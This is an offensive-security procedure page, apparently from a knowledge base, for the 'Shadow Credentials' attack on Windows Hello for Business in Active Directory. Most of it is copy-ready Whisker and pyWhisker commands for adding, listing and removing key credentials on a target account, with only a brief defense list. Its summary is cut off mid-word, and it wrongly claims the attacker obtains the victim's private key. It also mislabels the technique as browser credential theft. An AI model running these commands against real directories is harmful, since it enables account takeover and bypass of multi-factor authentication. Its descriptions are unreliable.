---
id: 04096923-a0f1-4a0c-8c15-897207318180
name: Shadow Credentials for Windows Hello
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:06.273418+00:00'
updated_at: '2023-04-10T20:26:09.558579+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Credentials from Password Stores|T1555 - Credentials from Password Stores]]'
- '[[Modify Authentication Process|T1556 - Modify Authentication Process]]'
- '[[Unsecured Credentials|T1552 - Unsecured Credentials]]'
sub_techniques:
- '[[Credentials from Web Browsers|T1555.003 - Credentials from Web Browsers]]'
- '[[Domain Controller Authentication|T1556.001 - Domain Controller Authentication]]'
- '[[Private Keys|T1552.004 - Private Keys]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Shadow Credentials]]'
commands:
- '[[Add a new key credential to the specified user]]'
- '[[Add new key credential to target object]]'
- '[[Add new key credential to target object]]'
- '[[List all key credentials associated with the specified user]]'
- '[[List msDS-KeyCredentialLink attribute entries of target object]]'
- '[[Remove key credential from target object]]'
- '[[Remove the specified key credential from the specified user]]'
---

# Shadow Credentials for Windows Hello

## Summary

Shadow Credentials for Windows Hello is a technique used by attackers to obtain user credentials stored on a Windows 10 device that supports Windows Hello for Business. Windows Hello for Business is a biometric authentication feature that allows users to sign in to their devices using facial recogn

## Description

# Description

Shadow Credentials for Windows Hello is a technique used by attackers to obtain user credentials stored on a Windows 10 device that supports Windows Hello for Business. Windows Hello for Business is a biometric authentication feature that allows users to sign in to their devices using facial recognition or a fingerprint. The technique involves manipulating the msDS-KeyCredentialLink attribute in Active Directory to link the attacker's public key to the victim's account. This allows the attacker to obtain the user's private key and use it to authenticate to any service that accepts the user's Windows Hello credentials.

From a technical perspective, an attacker can use Whisker to manage the msDS-KeyCredentialLink attribute and link their public key to the victim's account. This technique can be used to bypass multi-factor authentication (MFA) and gain access to sensitive data or systems.

From a business perspective, this technique can be used by attackers to gain access to sensitive data or systems, which can lead to data theft or ransomware attacks. It is important for organizations to be aware of this technique and take steps to mitigate the risk of credential theft.

 

## Requirements

1. Access to Active Directory

1. Whisker tool

 

## Defense

1. Implement strict access controls for the msDS-KeyCredentialLink attribute to prevent unauthorized modifications

1. Monitor for changes to the msDS-KeyCredentialLink attribute in Active Directory

1. Implement MFA for all user accounts to reduce the risk of credential theft

 

## Objectives

1. Obtain user credentials stored on a Windows 10 device that supports Windows Hello for Business

1. Bypass multi-factor authentication (MFA) and gain access to sensitive data or systems

 

# Instructions

1. To list all the entries of the msDS-KeyCredentialLink attribute of the target object, run the following command:

Whisker.exe list /target:computername$

To generate a public-private key pair and add a new key credential to the target object as if the user enrolled to WHfB from a new device, run the following command:

Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"

You can also add a key credential to a target object by running the following command:

Whisker.exe add /target:computername$ [/domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1]

To remove a key credential from the target object specified by a DeviceID GUID, run the following command:

Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b

 



**Code**: [[# Lists all the entries of the msDS-KeyCredentialL]]



> This JSON object provides commands to manage the msDS-KeyCredentialLink attribute of the target object using Whisker. The 'list' command is used to list all the entries of the msDS-KeyCredentialLink attribute of the target object. The 'add' command is used to generate a public-private key pair and add a new key credential to the target object as if the user enrolled to WHfB from a new device. The 'remove' command is used to remove a key credential from the target object specified by a DeviceID GUID. The 'instruction' field provides the commands with arguments and the 'explain' field provides a brief explanation of each command.



**Command** ([[List msDS-KeyCredentialLink attribute entries of target object]]):

```bash
Whisker.exe list /target:computername$
```





**Command** ([[Add new key credential to target object]]):

```bash
Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
```





**Command** ([[Add new key credential to target object]]):

```bash
Whisker.exe add /target:computername$ [/domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1]
```





**Command** ([[Remove key credential from target object]]):

```bash
Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b
```



2. To list all key credentials associated with the user, use the following command:
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"

To add a new key credential to the user, use the following command:
pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "add"

To remove a key credential from the user, use the following command:
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id "a8ce856e-9b58-61f9-8fd3-b079689eb46e"

 



**Code**: [[# Lists all the entries of the msDS-KeyCredentialL]]



> This command allows you to manage key credentials for Windows Hello for Business. With this command, you can list all the key credentials associated with a user, add a new key credential to a user, and remove a key credential from a user. To use this command, you will need to have pyWhisker installed on your Linux machine. Once installed, you can use the provided commands to manage key credentials for Windows Hello for Business.



**Command** ([[List all key credentials associated with the specified user]]):

```bash
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
```





**Command** ([[Add a new key credential to the specified user]]):

```bash
pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "add"
```





**Command** ([[Remove the specified key credential from the specified user]]):

```bash
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id "a8ce856e-9b58-61f9-8fd3-b079689eb46e"
```



## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Credentials from Password Stores|T1555 - Credentials from Password Stores]]
- [[Modify Authentication Process|T1556 - Modify Authentication Process]]
- [[Unsecured Credentials|T1552 - Unsecured Credentials]]

### Sub-Techniques

- [[Credentials from Web Browsers|T1555.003 - Credentials from Web Browsers]]
- [[Domain Controller Authentication|T1556.001 - Domain Controller Authentication]]
- [[Private Keys|T1552.004 - Private Keys]]

## Commands Used

- [[Add a new key credential to the specified user]]
- [[Add new key credential to target object]]
- [[Add new key credential to target object]]
- [[List all key credentials associated with the specified user]]
- [[List msDS-KeyCredentialLink attribute entries of target object]]
- [[Remove key credential from target object]]
- [[Remove the specified key credential from the specified user]]

## Tags

- [[Active Directory Attacks]]
- [[Shadow Credentials]]


